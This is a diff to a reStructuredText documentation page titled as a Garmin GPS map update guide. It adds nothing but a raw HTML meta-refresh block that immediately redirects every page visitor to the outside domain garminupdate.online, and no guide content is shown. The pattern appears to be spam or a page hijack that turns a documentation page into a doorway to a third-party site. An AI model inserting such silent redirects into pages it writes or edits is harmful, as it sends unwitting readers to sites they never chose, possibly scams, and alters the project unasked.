@@ -1,3 +1,7 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
 How to Update Garmin GPS Map? A Step-by-step Guide
 =====================
 .. toctree::
